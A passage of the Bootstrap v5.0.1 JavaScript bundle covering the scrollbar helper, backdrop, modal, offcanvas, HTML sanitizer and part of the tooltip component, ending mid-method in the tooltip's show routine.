  const SELECTOR_FIXED_CONTENT = '.fixed-top, .fixed-bottom, .is-fixed, .sticky-top';
  const SELECTOR_STICKY_CONTENT = '.sticky-top';

  const getWidth = () => {
    // https://developer.mozilla.org/en-US/docs/Web/API/Window/innerWidth#usage_notes
    const documentWidth = document.documentElement.clientWidth;
    return Math.abs(window.innerWidth - documentWidth);
  };

  const hide = (width = getWidth()) => {
    _disableOverFlow(); // give padding to element to balances the hidden scrollbar width


    _setElementAttributes('body', 'paddingRight', calculatedValue => calculatedValue + width); // trick: We adjust positive paddingRight and negative marginRight to sticky-top elements, to keep shown fullwidth


    _setElementAttributes(SELECTOR_FIXED_CONTENT, 'paddingRight', calculatedValue => calculatedValue + width);

    _setElementAttributes(SELECTOR_STICKY_CONTENT, 'marginRight', calculatedValue => calculatedValue - width);
  };

  const _disableOverFlow = () => {
    const actualValue = document.body.style.overflow;

    if (actualValue) {
      Manipulator.setDataAttribute(document.body, 'overflow', actualValue);
    }

    document.body.style.overflow = 'hidden';
  };

  const _setElementAttributes = (selector, styleProp, callback) => {
    const scrollbarWidth = getWidth();
    SelectorEngine.find(selector).forEach(element => {
      if (element !== document.body && window.innerWidth > element.clientWidth + scrollbarWidth) {
        return;
      }

      const actualValue = element.style[styleProp];
      const calculatedValue = window.getComputedStyle(element)[styleProp];
      Manipulator.setDataAttribute(element, styleProp, actualValue);
      element.style[styleProp] = `${callback(Number.parseFloat(calculatedValue))}px`;
    });
  };

  const reset = () => {
    _resetElementAttributes('body', 'overflow');

    _resetElementAttributes('body', 'paddingRight');

    _resetElementAttributes(SELECTOR_FIXED_CONTENT, 'paddingRight');

    _resetElementAttributes(SELECTOR_STICKY_CONTENT, 'marginRight');
  };

  const _resetElementAttributes = (selector, styleProp) => {
    SelectorEngine.find(selector).forEach(element => {
      const value = Manipulator.getDataAttribute(element, styleProp);

      if (typeof value === 'undefined') {
        element.style.removeProperty(styleProp);
      } else {
        Manipulator.removeDataAttribute(element, styleProp);
        element.style[styleProp] = value;
      }
    });
  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): util/backdrop.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */
  const Default$6 = {
    isVisible: true,
    // if false, we use the backdrop helper without adding any element to the dom
    isAnimated: false,
    rootElement: document.body,
    // give the choice to place backdrop under different elements
    clickCallback: null
  };
  const DefaultType$6 = {
    isVisible: 'boolean',
    isAnimated: 'boolean',
    rootElement: 'element',
    clickCallback: '(function|null)'
  };
  const NAME$7 = 'backdrop';
  const CLASS_NAME_BACKDROP = 'modal-backdrop';
  const CLASS_NAME_FADE$5 = 'fade';
  const CLASS_NAME_SHOW$6 = 'show';
  const EVENT_MOUSEDOWN = `mousedown.bs.${NAME$7}`;

  class Backdrop {
    constructor(config) {
      this._config = this._getConfig(config);
      this._isAppended = false;
      this._element = null;
    }

    show(callback) {
      if (!this._config.isVisible) {
        execute(callback);
        return;
      }

      this._append();

      if (this._config.isAnimated) {
        reflow(this._getElement());
      }

      this._getElement().classList.add(CLASS_NAME_SHOW$6);

      this._emulateAnimation(() => {
        execute(callback);
      });
    }

    hide(callback) {
      if (!this._config.isVisible) {
        execute(callback);
        return;
      }

      this._getElement().classList.remove(CLASS_NAME_SHOW$6);

      this._emulateAnimation(() => {
        this.dispose();
        execute(callback);
      });
    } // Private


    _getElement() {
      if (!this._element) {
        const backdrop = document.createElement('div');
        backdrop.className = CLASS_NAME_BACKDROP;

        if (this._config.isAnimated) {
          backdrop.classList.add(CLASS_NAME_FADE$5);
        }

        this._element = backdrop;
      }

      return this._element;
    }

    _getConfig(config) {
      config = { ...Default$6,
        ...(typeof config === 'object' ? config : {})
      };
      config.rootElement = config.rootElement || document.body;
      typeCheckConfig(NAME$7, config, DefaultType$6);
      return config;
    }

    _append() {
      if (this._isAppended) {
        return;
      }

      this._config.rootElement.appendChild(this._getElement());

      EventHandler.on(this._getElement(), EVENT_MOUSEDOWN, () => {
        execute(this._config.clickCallback);
      });
      this._isAppended = true;
    }

    dispose() {
      if (!this._isAppended) {
        return;
      }

      EventHandler.off(this._element, EVENT_MOUSEDOWN);

      this._getElement().parentNode.removeChild(this._element);

      this._isAppended = false;
    }

    _emulateAnimation(callback) {
      if (!this._config.isAnimated) {
        execute(callback);
        return;
      }

      const backdropTransitionDuration = getTransitionDurationFromElement(this._getElement());
      EventHandler.one(this._getElement(), 'transitionend', () => execute(callback));
      emulateTransitionEnd(this._getElement(), backdropTransitionDuration);
    }

  }

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): modal.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$6 = 'modal';
  const DATA_KEY$6 = 'bs.modal';
  const EVENT_KEY$6 = `.${DATA_KEY$6}`;
  const DATA_API_KEY$3 = '.data-api';
  const ESCAPE_KEY$1 = 'Escape';
  const Default$5 = {
    backdrop: true,
    keyboard: true,
    focus: true
  };
  const DefaultType$5 = {
    backdrop: '(boolean|string)',
    keyboard: 'boolean',
    focus: 'boolean'
  };
  const EVENT_HIDE$3 = `hide${EVENT_KEY$6}`;
  const EVENT_HIDE_PREVENTED = `hidePrevented${EVENT_KEY$6}`;
  const EVENT_HIDDEN$3 = `hidden${EVENT_KEY$6}`;
  const EVENT_SHOW$3 = `show${EVENT_KEY$6}`;
  const EVENT_SHOWN$3 = `shown${EVENT_KEY$6}`;
  const EVENT_FOCUSIN$2 = `focusin${EVENT_KEY$6}`;
  const EVENT_RESIZE = `resize${EVENT_KEY$6}`;
  const EVENT_CLICK_DISMISS$2 = `click.dismiss${EVENT_KEY$6}`;
  const EVENT_KEYDOWN_DISMISS$1 = `keydown.dismiss${EVENT_KEY$6}`;
  const EVENT_MOUSEUP_DISMISS = `mouseup.dismiss${EVENT_KEY$6}`;
  const EVENT_MOUSEDOWN_DISMISS = `mousedown.dismiss${EVENT_KEY$6}`;
  const EVENT_CLICK_DATA_API$2 = `click${EVENT_KEY$6}${DATA_API_KEY$3}`;
  const CLASS_NAME_OPEN = 'modal-open';
  const CLASS_NAME_FADE$4 = 'fade';
  const CLASS_NAME_SHOW$5 = 'show';
  const CLASS_NAME_STATIC = 'modal-static';
  const SELECTOR_DIALOG = '.modal-dialog';
  const SELECTOR_MODAL_BODY = '.modal-body';
  const SELECTOR_DATA_TOGGLE$2 = '[data-bs-toggle="modal"]';
  const SELECTOR_DATA_DISMISS$2 = '[data-bs-dismiss="modal"]';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Modal extends BaseComponent {
    constructor(element, config) {
      super(element);
      this._config = this._getConfig(config);
      this._dialog = SelectorEngine.findOne(SELECTOR_DIALOG, this._element);
      this._backdrop = this._initializeBackDrop();
      this._isShown = false;
      this._ignoreBackdropClick = false;
      this._isTransitioning = false;
    } // Getters


    static get Default() {
      return Default$5;
    }

    static get NAME() {
      return NAME$6;
    } // Public


    toggle(relatedTarget) {
      return this._isShown ? this.hide() : this.show(relatedTarget);
    }

    show(relatedTarget) {
      if (this._isShown || this._isTransitioning) {
        return;
      }

      if (this._isAnimated()) {
        this._isTransitioning = true;
      }

      const showEvent = EventHandler.trigger(this._element, EVENT_SHOW$3, {
        relatedTarget
      });

      if (this._isShown || showEvent.defaultPrevented) {
        return;
      }

      this._isShown = true;
      hide();
      document.body.classList.add(CLASS_NAME_OPEN);

      this._adjustDialog();

      this._setEscapeEvent();

      this._setResizeEvent();

      EventHandler.on(this._element, EVENT_CLICK_DISMISS$2, SELECTOR_DATA_DISMISS$2, event => this.hide(event));
      EventHandler.on(this._dialog, EVENT_MOUSEDOWN_DISMISS, () => {
        EventHandler.one(this._element, EVENT_MOUSEUP_DISMISS, event => {
          if (event.target === this._element) {
            this._ignoreBackdropClick = true;
          }
        });
      });

      this._showBackdrop(() => this._showElement(relatedTarget));
    }

    hide(event) {
      if (event) {
        event.preventDefault();
      }

      if (!this._isShown || this._isTransitioning) {
        return;
      }

      const hideEvent = EventHandler.trigger(this._element, EVENT_HIDE$3);

      if (hideEvent.defaultPrevented) {
        return;
      }

      this._isShown = false;

      const isAnimated = this._isAnimated();

      if (isAnimated) {
        this._isTransitioning = true;
      }

      this._setEscapeEvent();

      this._setResizeEvent();

      EventHandler.off(document, EVENT_FOCUSIN$2);

      this._element.classList.remove(CLASS_NAME_SHOW$5);

      EventHandler.off(this._element, EVENT_CLICK_DISMISS$2);
      EventHandler.off(this._dialog, EVENT_MOUSEDOWN_DISMISS);

      this._queueCallback(() => this._hideModal(), this._element, isAnimated);
    }

    dispose() {
      [window, this._dialog].forEach(htmlElement => EventHandler.off(htmlElement, EVENT_KEY$6));

      this._backdrop.dispose();

      super.dispose();
      /**
       * `document` has 2 events `EVENT_FOCUSIN` and `EVENT_CLICK_DATA_API`
       * Do not move `document` in `htmlElements` array
       * It will remove `EVENT_CLICK_DATA_API` event that should remain
       */

      EventHandler.off(document, EVENT_FOCUSIN$2);
    }

    handleUpdate() {
      this._adjustDialog();
    } // Private


    _initializeBackDrop() {
      return new Backdrop({
        isVisible: Boolean(this._config.backdrop),
        // 'static' option will be translated to true, and booleans will keep their value
        isAnimated: this._isAnimated()
      });
    }

    _getConfig(config) {
      config = { ...Default$5,
        ...Manipulator.getDataAttributes(this._element),
        ...config
      };
      typeCheckConfig(NAME$6, config, DefaultType$5);
      return config;
    }

    _showElement(relatedTarget) {
      const isAnimated = this._isAnimated();

      const modalBody = SelectorEngine.findOne(SELECTOR_MODAL_BODY, this._dialog);

      if (!this._element.parentNode || this._element.parentNode.nodeType !== Node.ELEMENT_NODE) {
        // Don't move modal's DOM position
        document.body.appendChild(this._element);
      }

      this._element.style.display = 'block';

      this._element.removeAttribute('aria-hidden');

      this._element.setAttribute('aria-modal', true);

      this._element.setAttribute('role', 'dialog');

      this._element.scrollTop = 0;

      if (modalBody) {
        modalBody.scrollTop = 0;
      }

      if (isAnimated) {
        reflow(this._element);
      }

      this._element.classList.add(CLASS_NAME_SHOW$5);

      if (this._config.focus) {
        this._enforceFocus();
      }

      const transitionComplete = () => {
        if (this._config.focus) {
          this._element.focus();
        }

        this._isTransitioning = false;
        EventHandler.trigger(this._element, EVENT_SHOWN$3, {
          relatedTarget
        });
      };

      this._queueCallback(transitionComplete, this._dialog, isAnimated);
    }

    _enforceFocus() {
      EventHandler.off(document, EVENT_FOCUSIN$2); // guard against infinite focus loop

      EventHandler.on(document, EVENT_FOCUSIN$2, event => {
        if (document !== event.target && this._element !== event.target && !this._element.contains(event.target)) {
          this._element.focus();
        }
      });
    }

    _setEscapeEvent() {
      if (this._isShown) {
        EventHandler.on(this._element, EVENT_KEYDOWN_DISMISS$1, event => {
          if (this._config.keyboard && event.key === ESCAPE_KEY$1) {
            event.preventDefault();
            this.hide();
          } else if (!this._config.keyboard && event.key === ESCAPE_KEY$1) {
            this._triggerBackdropTransition();
          }
        });
      } else {
        EventHandler.off(this._element, EVENT_KEYDOWN_DISMISS$1);
      }
    }

    _setResizeEvent() {
      if (this._isShown) {
        EventHandler.on(window, EVENT_RESIZE, () => this._adjustDialog());
      } else {
        EventHandler.off(window, EVENT_RESIZE);
      }
    }

    _hideModal() {
      this._element.style.display = 'none';

      this._element.setAttribute('aria-hidden', true);

      this._element.removeAttribute('aria-modal');

      this._element.removeAttribute('role');

      this._isTransitioning = false;

      this._backdrop.hide(() => {
        document.body.classList.remove(CLASS_NAME_OPEN);

        this._resetAdjustments();

        reset();
        EventHandler.trigger(this._element, EVENT_HIDDEN$3);
      });
    }

    _showBackdrop(callback) {
      EventHandler.on(this._element, EVENT_CLICK_DISMISS$2, event => {
        if (this._ignoreBackdropClick) {
          this._ignoreBackdropClick = false;
          return;
        }

        if (event.target !== event.currentTarget) {
          return;
        }

        if (this._config.backdrop === true) {
          this.hide();
        } else if (this._config.backdrop === 'static') {
          this._triggerBackdropTransition();
        }
      });

      this._backdrop.show(callback);
    }

    _isAnimated() {
      return this._element.classList.contains(CLASS_NAME_FADE$4);
    }

    _triggerBackdropTransition() {
      const hideEvent = EventHandler.trigger(this._element, EVENT_HIDE_PREVENTED);

      if (hideEvent.defaultPrevented) {
        return;
      }

      const isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;

      if (!isModalOverflowing) {
        this._element.style.overflowY = 'hidden';
      }

      this._element.classList.add(CLASS_NAME_STATIC);

      const modalTransitionDuration = getTransitionDurationFromElement(this._dialog);
      EventHandler.off(this._element, 'transitionend');
      EventHandler.one(this._element, 'transitionend', () => {
        this._element.classList.remove(CLASS_NAME_STATIC);

        if (!isModalOverflowing) {
          EventHandler.one(this._element, 'transitionend', () => {
            this._element.style.overflowY = '';
          });
          emulateTransitionEnd(this._element, modalTransitionDuration);
        }
      });
      emulateTransitionEnd(this._element, modalTransitionDuration);

      this._element.focus();
    } // ----------------------------------------------------------------------
    // the following methods are used to handle overflowing modals
    // ----------------------------------------------------------------------


    _adjustDialog() {
      const isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;
      const scrollbarWidth = getWidth();
      const isBodyOverflowing = scrollbarWidth > 0;

      if (!isBodyOverflowing && isModalOverflowing && !isRTL() || isBodyOverflowing && !isModalOverflowing && isRTL()) {
        this._element.style.paddingLeft = `${scrollbarWidth}px`;
      }

      if (isBodyOverflowing && !isModalOverflowing && !isRTL() || !isBodyOverflowing && isModalOverflowing && isRTL()) {
        this._element.style.paddingRight = `${scrollbarWidth}px`;
      }
    }

    _resetAdjustments() {
      this._element.style.paddingLeft = '';
      this._element.style.paddingRight = '';
    } // Static


    static jQueryInterface(config, relatedTarget) {
      return this.each(function () {
        const data = Modal.getInstance(this) || new Modal(this, typeof config === 'object' ? config : {});

        if (typeof config !== 'string') {
          return;
        }

        if (typeof data[config] === 'undefined') {
          throw new TypeError(`No method named "${config}"`);
        }

        data[config](relatedTarget);
      });
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(document, EVENT_CLICK_DATA_API$2, SELECTOR_DATA_TOGGLE$2, function (event) {
    const target = getElementFromSelector(this);

    if (['A', 'AREA'].includes(this.tagName)) {
      event.preventDefault();
    }

    EventHandler.one(target, EVENT_SHOW$3, showEvent => {
      if (showEvent.defaultPrevented) {
        // only register focus restorer if modal will actually get shown
        return;
      }

      EventHandler.one(target, EVENT_HIDDEN$3, () => {
        if (isVisible(this)) {
          this.focus();
        }
      });
    });
    const data = Modal.getInstance(target) || new Modal(target);
    data.toggle(this);
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Modal to jQuery only if jQuery is present
   */

  defineJQueryPlugin(Modal);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): offcanvas.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$5 = 'offcanvas';
  const DATA_KEY$5 = 'bs.offcanvas';
  const EVENT_KEY$5 = `.${DATA_KEY$5}`;
  const DATA_API_KEY$2 = '.data-api';
  const EVENT_LOAD_DATA_API$1 = `load${EVENT_KEY$5}${DATA_API_KEY$2}`;
  const ESCAPE_KEY = 'Escape';
  const Default$4 = {
    backdrop: true,
    keyboard: true,
    scroll: false
  };
  const DefaultType$4 = {
    backdrop: 'boolean',
    keyboard: 'boolean',
    scroll: 'boolean'
  };
  const CLASS_NAME_SHOW$4 = 'show';
  const OPEN_SELECTOR = '.offcanvas.show';
  const EVENT_SHOW$2 = `show${EVENT_KEY$5}`;
  const EVENT_SHOWN$2 = `shown${EVENT_KEY$5}`;
  const EVENT_HIDE$2 = `hide${EVENT_KEY$5}`;
  const EVENT_HIDDEN$2 = `hidden${EVENT_KEY$5}`;
  const EVENT_FOCUSIN$1 = `focusin${EVENT_KEY$5}`;
  const EVENT_CLICK_DATA_API$1 = `click${EVENT_KEY$5}${DATA_API_KEY$2}`;
  const EVENT_CLICK_DISMISS$1 = `click.dismiss${EVENT_KEY$5}`;
  const EVENT_KEYDOWN_DISMISS = `keydown.dismiss${EVENT_KEY$5}`;
  const SELECTOR_DATA_DISMISS$1 = '[data-bs-dismiss="offcanvas"]';
  const SELECTOR_DATA_TOGGLE$1 = '[data-bs-toggle="offcanvas"]';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Offcanvas extends BaseComponent {
    constructor(element, config) {
      super(element);
      this._config = this._getConfig(config);
      this._isShown = false;
      this._backdrop = this._initializeBackDrop();

      this._addEventListeners();
    } // Getters


    static get NAME() {
      return NAME$5;
    }

    static get Default() {
      return Default$4;
    } // Public


    toggle(relatedTarget) {
      return this._isShown ? this.hide() : this.show(relatedTarget);
    }

    show(relatedTarget) {
      if (this._isShown) {
        return;
      }

      const showEvent = EventHandler.trigger(this._element, EVENT_SHOW$2, {
        relatedTarget
      });

      if (showEvent.defaultPrevented) {
        return;
      }

      this._isShown = true;
      this._element.style.visibility = 'visible';

      this._backdrop.show();

      if (!this._config.scroll) {
        hide();

        this._enforceFocusOnElement(this._element);
      }

      this._element.removeAttribute('aria-hidden');

      this._element.setAttribute('aria-modal', true);

      this._element.setAttribute('role', 'dialog');

      this._element.classList.add(CLASS_NAME_SHOW$4);

      const completeCallBack = () => {
        EventHandler.trigger(this._element, EVENT_SHOWN$2, {
          relatedTarget
        });
      };

      this._queueCallback(completeCallBack, this._element, true);
    }

    hide() {
      if (!this._isShown) {
        return;
      }

      const hideEvent = EventHandler.trigger(this._element, EVENT_HIDE$2);

      if (hideEvent.defaultPrevented) {
        return;
      }

      EventHandler.off(document, EVENT_FOCUSIN$1);

      this._element.blur();

      this._isShown = false;

      this._element.classList.remove(CLASS_NAME_SHOW$4);

      this._backdrop.hide();

      const completeCallback = () => {
        this._element.setAttribute('aria-hidden', true);

        this._element.removeAttribute('aria-modal');

        this._element.removeAttribute('role');

        this._element.style.visibility = 'hidden';

        if (!this._config.scroll) {
          reset();
        }

        EventHandler.trigger(this._element, EVENT_HIDDEN$2);
      };

      this._queueCallback(completeCallback, this._element, true);
    }

    dispose() {
      this._backdrop.dispose();

      super.dispose();
      EventHandler.off(document, EVENT_FOCUSIN$1);
    } // Private


    _getConfig(config) {
      config = { ...Default$4,
        ...Manipulator.getDataAttributes(this._element),
        ...(typeof config === 'object' ? config : {})
      };
      typeCheckConfig(NAME$5, config, DefaultType$4);
      return config;
    }

    _initializeBackDrop() {
      return new Backdrop({
        isVisible: this._config.backdrop,
        isAnimated: true,
        rootElement: this._element.parentNode,
        clickCallback: () => this.hide()
      });
    }

    _enforceFocusOnElement(element) {
      EventHandler.off(document, EVENT_FOCUSIN$1); // guard against infinite focus loop

      EventHandler.on(document, EVENT_FOCUSIN$1, event => {
        if (document !== event.target && element !== event.target && !element.contains(event.target)) {
          element.focus();
        }
      });
      element.focus();
    }

    _addEventListeners() {
      EventHandler.on(this._element, EVENT_CLICK_DISMISS$1, SELECTOR_DATA_DISMISS$1, () => this.hide());
      EventHandler.on(this._element, EVENT_KEYDOWN_DISMISS, event => {
        if (this._config.keyboard && event.key === ESCAPE_KEY) {
          this.hide();
        }
      });
    } // Static


    static jQueryInterface(config) {
      return this.each(function () {
        const data = Data.get(this, DATA_KEY$5) || new Offcanvas(this, typeof config === 'object' ? config : {});

        if (typeof config !== 'string') {
          return;
        }

        if (data[config] === undefined || config.startsWith('_') || config === 'constructor') {
          throw new TypeError(`No method named "${config}"`);
        }

        data[config](this);
      });
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(document, EVENT_CLICK_DATA_API$1, SELECTOR_DATA_TOGGLE$1, function (event) {
    const target = getElementFromSelector(this);

    if (['A', 'AREA'].includes(this.tagName)) {
      event.preventDefault();
    }

    if (isDisabled(this)) {
      return;
    }

    EventHandler.one(target, EVENT_HIDDEN$2, () => {
      // focus on trigger when it is closed
      if (isVisible(this)) {
        this.focus();
      }
    }); // avoid conflict when clicking a toggler of an offcanvas, while another is open

    const allReadyOpen = SelectorEngine.findOne(OPEN_SELECTOR);

    if (allReadyOpen && allReadyOpen !== target) {
      Offcanvas.getInstance(allReadyOpen).hide();
    }

    const data = Data.get(target, DATA_KEY$5) || new Offcanvas(target);
    data.toggle(this);
  });
  EventHandler.on(window, EVENT_LOAD_DATA_API$1, () => {
    SelectorEngine.find(OPEN_SELECTOR).forEach(el => (Data.get(el, DATA_KEY$5) || new Offcanvas(el)).show());
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  defineJQueryPlugin(Offcanvas);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): util/sanitizer.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  const uriAttrs = new Set(['background', 'cite', 'href', 'itemtype', 'longdesc', 'poster', 'src', 'xlink:href']);
  const ARIA_ATTRIBUTE_PATTERN = /^aria-[\w-]*$/i;
  /**
   * A pattern that recognizes a commonly useful subset of URLs that are safe.
   *
   * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
   */

  const SAFE_URL_PATTERN = /^(?:(?:https?|mailto|ftp|tel|file):|[^#&/:?]*(?:[#/?]|$))/i;
  /**
   * A pattern that matches safe data URLs. Only matches image, video and audio types.
   *
   * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
   */

  const DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[\d+/a-z]+=*$/i;

  const allowedAttribute = (attr, allowedAttributeList) => {
    const attrName = attr.nodeName.toLowerCase();

    if (allowedAttributeList.includes(attrName)) {
      if (uriAttrs.has(attrName)) {
        return Boolean(SAFE_URL_PATTERN.test(attr.nodeValue) || DATA_URL_PATTERN.test(attr.nodeValue));
      }

      return true;
    }

    const regExp = allowedAttributeList.filter(attrRegex => attrRegex instanceof RegExp); // Check if a regular expression validates the attribute.

    for (let i = 0, len = regExp.length; i < len; i++) {
      if (regExp[i].test(attrName)) {
        return true;
      }
    }

    return false;
  };

  const DefaultAllowlist = {
    // Global attributes allowed on any supplied element below.
    '*': ['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN],
    a: ['target', 'href', 'title', 'rel'],
    area: [],
    b: [],
    br: [],
    col: [],
    code: [],
    div: [],
    em: [],
    hr: [],
    h1: [],
    h2: [],
    h3: [],
    h4: [],
    h5: [],
    h6: [],
    i: [],
    img: ['src', 'srcset', 'alt', 'title', 'width', 'height'],
    li: [],
    ol: [],
    p: [],
    pre: [],
    s: [],
    small: [],
    span: [],
    sub: [],
    sup: [],
    strong: [],
    u: [],
    ul: []
  };
  function sanitizeHtml(unsafeHtml, allowList, sanitizeFn) {
    if (!unsafeHtml.length) {
      return unsafeHtml;
    }

    if (sanitizeFn && typeof sanitizeFn === 'function') {
      return sanitizeFn(unsafeHtml);
    }

    const domParser = new window.DOMParser();
    const createdDocument = domParser.parseFromString(unsafeHtml, 'text/html');
    const allowlistKeys = Object.keys(allowList);
    const elements = [].concat(...createdDocument.body.querySelectorAll('*'));

    for (let i = 0, len = elements.length; i < len; i++) {
      const el = elements[i];
      const elName = el.nodeName.toLowerCase();

      if (!allowlistKeys.includes(elName)) {
        el.parentNode.removeChild(el);
        continue;
      }

      const attributeList = [].concat(...el.attributes);
      const allowedAttributes = [].concat(allowList['*'] || [], allowList[elName] || []);
      attributeList.forEach(attr => {
        if (!allowedAttribute(attr, allowedAttributes)) {
          el.removeAttribute(attr.nodeName);
        }
      });
    }

    return createdDocument.body.innerHTML;
  }

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): tooltip.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$4 = 'tooltip';
  const DATA_KEY$4 = 'bs.tooltip';
  const EVENT_KEY$4 = `.${DATA_KEY$4}`;
  const CLASS_PREFIX$1 = 'bs-tooltip';
  const BSCLS_PREFIX_REGEX$1 = new RegExp(`(^|\\s)${CLASS_PREFIX$1}\\S+`, 'g');
  const DISALLOWED_ATTRIBUTES = new Set(['sanitize', 'allowList', 'sanitizeFn']);
  const DefaultType$3 = {
    animation: 'boolean',
    template: 'string',
    title: '(string|element|function)',
    trigger: 'string',
    delay: '(number|object)',
    html: 'boolean',
    selector: '(string|boolean)',
    placement: '(string|function)',
    offset: '(array|string|function)',
    container: '(string|element|boolean)',
    fallbackPlacements: 'array',
    boundary: '(string|element)',
    customClass: '(string|function)',
    sanitize: 'boolean',
    sanitizeFn: '(null|function)',
    allowList: 'object',
    popperConfig: '(null|object|function)'
  };
  const AttachmentMap = {
    AUTO: 'auto',
    TOP: 'top',
    RIGHT: isRTL() ? 'left' : 'right',
    BOTTOM: 'bottom',
    LEFT: isRTL() ? 'right' : 'left'
  };
  const Default$3 = {
    animation: true,
    template: '<div class="tooltip" role="tooltip">' + '<div class="tooltip-arrow"></div>' + '<div class="tooltip-inner"></div>' + '</div>',
    trigger: 'hover focus',
    title: '',
    delay: 0,
    html: false,
    selector: false,
    placement: 'top',
    offset: [0, 0],
    container: false,
    fallbackPlacements: ['top', 'right', 'bottom', 'left'],
    boundary: 'clippingParents',
    customClass: '',
    sanitize: true,
    sanitizeFn: null,
    allowList: DefaultAllowlist,
    popperConfig: null
  };
  const Event$2 = {
    HIDE: `hide${EVENT_KEY$4}`,
    HIDDEN: `hidden${EVENT_KEY$4}`,
    SHOW: `show${EVENT_KEY$4}`,
    SHOWN: `shown${EVENT_KEY$4}`,
    INSERTED: `inserted${EVENT_KEY$4}`,
    CLICK: `click${EVENT_KEY$4}`,
    FOCUSIN: `focusin${EVENT_KEY$4}`,
    FOCUSOUT: `focusout${EVENT_KEY$4}`,
    MOUSEENTER: `mouseenter${EVENT_KEY$4}`,
    MOUSELEAVE: `mouseleave${EVENT_KEY$4}`
  };
  const CLASS_NAME_FADE$3 = 'fade';
  const CLASS_NAME_MODAL = 'modal';
  const CLASS_NAME_SHOW$3 = 'show';
  const HOVER_STATE_SHOW = 'show';
  const HOVER_STATE_OUT = 'out';
  const SELECTOR_TOOLTIP_INNER = '.tooltip-inner';
  const TRIGGER_HOVER = 'hover';
  const TRIGGER_FOCUS = 'focus';
  const TRIGGER_CLICK = 'click';
  const TRIGGER_MANUAL = 'manual';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Tooltip extends BaseComponent {
    constructor(element, config) {
      if (typeof Popper__namespace === 'undefined') {
        throw new TypeError('Bootstrap\'s tooltips require Popper (https://popper.js.org)');
      }

      super(element); // private

      this._isEnabled = true;
      this._timeout = 0;
      this._hoverState = '';
      this._activeTrigger = {};
      this._popper = null; // Protected

      this._config = this._getConfig(config);
      this.tip = null;

      this._setListeners();
    } // Getters


    static get Default() {
      return Default$3;
    }

    static get NAME() {
      return NAME$4;
    }

    static get Event() {
      return Event$2;
    }

    static get DefaultType() {
      return DefaultType$3;
    } // Public


    enable() {
      this._isEnabled = true;
    }

    disable() {
      this._isEnabled = false;
    }

    toggleEnabled() {
      this._isEnabled = !this._isEnabled;
    }

    toggle(event) {
      if (!this._isEnabled) {
        return;
      }

      if (event) {
        const context = this._initializeOnDelegatedTarget(event);

        context._activeTrigger.click = !context._activeTrigger.click;

        if (context._isWithActiveTrigger()) {
          context._enter(null, context);
        } else {
          context._leave(null, context);
        }
      } else {
        if (this.getTipElement().classList.contains(CLASS_NAME_SHOW$3)) {
          this._leave(null, this);

          return;
        }

        this._enter(null, this);
      }
    }

    dispose() {
      clearTimeout(this._timeout);
      EventHandler.off(this._element.closest(`.${CLASS_NAME_MODAL}`), 'hide.bs.modal', this._hideModalHandler);

      if (this.tip && this.tip.parentNode) {
        this.tip.parentNode.removeChild(this.tip);
      }

      if (this._popper) {
        this._popper.destroy();
      }

      super.dispose();
    }

    show() {
      if (this._element.style.display === 'none') {
        throw new Error('Please use show on visible elements');
      }

      if (!(this.isWithContent() && this._isEnabled)) {
        return;
      }

      const showEvent = EventHandler.trigger(this._element, this.constructor.Event.SHOW);
      const shadowRoot = findShadowRoot(this._element);
      const isInTheDom = shadowRoot === null ? this._element.ownerDocument.documentElement.contains(this._element) : shadowRoot.contains(this._element);

      if (showEvent.defaultPrevented || !isInTheDom) {
        return;
      }

      const tip = this.getTipElement();
      const tipId = getUID(this.constructor.NAME);
      tip.setAttribute('id', tipId);

      this._element.setAttribute('aria-describedby', tipId);

      this.setContent();

      if (this._config.animation) {
        tip.classList.add(CLASS_NAME_FADE$3);
      }

      const placement = typeof this._config.placement === 'function' ? this._config.placement.call(this, tip, this._element) : this._config.placement;

      const attachment = this._getAttachment(placement);

      this._addAttachmentClass(attachment);

      const {
        container
      } = this._config;
      Data.set(tip, this.constructor.DATA_KEY, this);

      if (!this._element.ownerDocument.documentElement.contains(this.tip)) {
        container.appendChild(tip);
        EventHandler.trigger(this._element, this.constructor.Event.INSERTED);
      }

      if (this._popper) {
        this._popper.update();
      } else {
